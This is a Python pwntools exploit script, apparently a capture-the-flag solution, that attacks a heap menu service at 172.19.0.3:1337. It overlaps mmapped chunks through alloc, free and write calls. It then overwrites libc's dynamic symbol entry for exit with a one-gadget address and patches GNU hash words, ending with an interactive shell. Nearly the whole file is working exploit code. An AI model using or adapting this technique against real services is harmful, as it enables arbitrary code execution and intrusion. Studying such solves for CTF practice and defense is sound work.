from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

# gcc - libc_start is 0x5bcff0 after the alloc at 0
elf_header_ptr = 0x2edff0
print("elf_header_ptr: {}".format(hex(elf_header_ptr)))

# readelf -S /libc
gnu_hash = elf_header_ptr + 0x00003930
dynsym = elf_header_ptr + 0x00007660

# readelf --dyn-sym /libc
#exit_address = elf_header_ptr + 0x44be0
# root@df0ceb4b0d2e:/home/pwn# readelf --dyn-sym /lib/x86_64-linux-gnu/libc.so.6 | grep exit
#   138: 0000000000044be0    32 FUNC    GLOBAL DEFAULT   16 exit@@GLIBC_2.2.5
# entry #138, each entry is 6 4-byte ints
exit_symbol_entry = dynsym + 138 * 6 * 4

# pwndbg> x/5xw 0x7fc23dfc7000 + 0x00007660 + 138 * 6 * 4
# 0x7fc23dfcf350: 0x00003031      0x00100012      0x00044be0      0x00000000
# 0x7fc23dfcf360: 0x00000020
new_exit_entry = b''
new_exit_entry += p32(0x00003031)
new_exit_entry += p32(0x00100012)
#new_exit_entry += p32(0x00044be0) # exit
new_exit_entry += p32(0x000df54f) # one gadget
new_exit_entry += p32(0x00000000)
new_exit_entry += p32(0x00000020)
new_exit_entry += p32(0x00000000)

elf_bitmask_ptr = elf_header_ptr + 0

print('exit offset from input: ', hex(exit_symbol_entry))
print('exit offset from libc: ', hex(exit_symbol_entry - elf_header_ptr)) 

# p = process('./pwn')
p = remote('172.19.0.3', 1337)

# gdb.attach(p, """
# c
# """)


def allocate(idx, size):
    p.sendlineafter("1: alloc; 2: free; 3: write> ", "1")
    p.sendlineafter("idx> ", str(idx))
    p.sendlineafter("size> ", str(size))
    print("Allocated chunk:\n  idx {}\n  size {}".format(idx, size))

def free(idx):
    p.sendlineafter("1: alloc; 2: free; 3: write> ", "2")
    p.sendlineafter("idx> ", str(idx))
    print("Freed chunk:\n  idx {}".format(idx))

def write(idx, offset, content: bytes):
    p.sendlineafter("1: alloc; 2: free; 3: write> ", "3")
    time.sleep(1)
    p.sendlineafter("idx> ", str(idx))
    p.sendlineafter("offset> ", str(offset))
    p.sendline(content)
    print("Wrote to chunk:\n  idx: {}, offset: {}, content: {}".format(idx, offset, enhex(content)))

mmap_size = 0xfffe8
# allocate(1, mmap_size - 0x1000)
free(1) # Just ensure that memset has been called/loaded.

allocate(1, mmap_size) # e8 is max to get size of 0x101000
allocate(2, mmap_size)
allocate(3, mmap_size)
size = 0x100000 * 2
overwrite_amount = 0x15000
write(3, mmap_size, cyclic(8) + p64(0x100000) + p64(size + overwrite_amount + 2))
free(2)
allocate(0, 0x300000)

write(0, exit_symbol_entry, new_exit_entry)
print(p64(0x010220a044103081))
write(0, elf_header_ptr + 0x3940, p64(0x010220a044103081))
write(0, elf_header_ptr + 0x4100, p64(0xf000028c0200130e))
write(0, elf_header_ptr + 0x4228, p64(0x0000000000000089))
write(0, elf_header_ptr + 0x52f8, p64(0x7c967e3e7c93f2a0) + p64(0xa36b4f2b7c967e3e))

p.interactive()
